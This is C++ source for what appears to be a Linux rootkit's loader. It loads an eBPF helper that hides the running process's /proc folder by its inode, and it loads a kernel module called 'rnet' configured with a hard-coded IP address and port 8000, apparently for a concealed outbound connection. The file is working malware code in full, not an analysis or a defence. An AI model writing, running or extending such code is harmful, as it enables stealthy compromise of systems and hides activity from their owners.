#include "common.h"
#include "rootkit/KernelModuleHelper.hpp"
#include "rootkit/RootkitBpfHelper.hpp"
#include "rootkit/Utils.hpp"

#include <csignal>
#include <iostream>
#include <optional>
#include <string>
#include <sys/stat.h>

#define RNET_NAME "rnet"
#define RNET_PATH "./" RNET_NAME ".ko"

struct SetupData {
    uint64_t inode;
    pid_t pid;
};

static volatile bool exiting = false;
static void sig_handler(int) { exiting = true; }

SetupData get_setup_data();

static int rb_event(void * ctx, void * data, size_t data_sz) {
    const struct event * e = reinterpret_cast<const struct event *>(data);
    printf("Hidden Folder: %s, inode: %llu\n", (char *)e->filename, e->inode);
    return 0;
}

int main(int argc, char ** argv) {
    // Set signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Load bpf program and its syscalls
    rootkit::RootkitBpfHelper rootkit(get_setup_data().inode, rb_event);

    rootkit::KernelModuleHelper module(RNET_PATH, RNET_NAME, DEV_NAME);

    if (module.status() == std::nullopt) {
        // Prepare data to send
        struct conn_info data;
        data.dport = 8000;

        auto ip = rootkit::utils::convert_ip("192.168.70.165");
        if (!ip.has_value())
            return 1;

        data.daddr = ip.value();
        data.id = 1;

        // Send data to the kernel module
        module.setData(data);
    }

    std::cout << "listening for events... Ctrl-C to exit\n";

    // Get data from ring buffer till exit signal or error
    while (!exiting) {
        rootkit.rb_poll(1000);
        if (rootkit.status() != std::nullopt) {
            break;
        }
    }

    return 0;
}

SetupData get_setup_data() {
    SetupData data;
    data.pid = getpid();
    std::cout << "Pid: " << data.pid << std::endl;

    struct stat sb;
    const std::string pid_folder = "/proc/" + std::to_string(data.pid);
    if (stat(pid_folder.c_str(), &sb) == -1) {
        perror("stat");
        exit(1);
    }

    data.inode = sb.st_ino;

    return data;
}
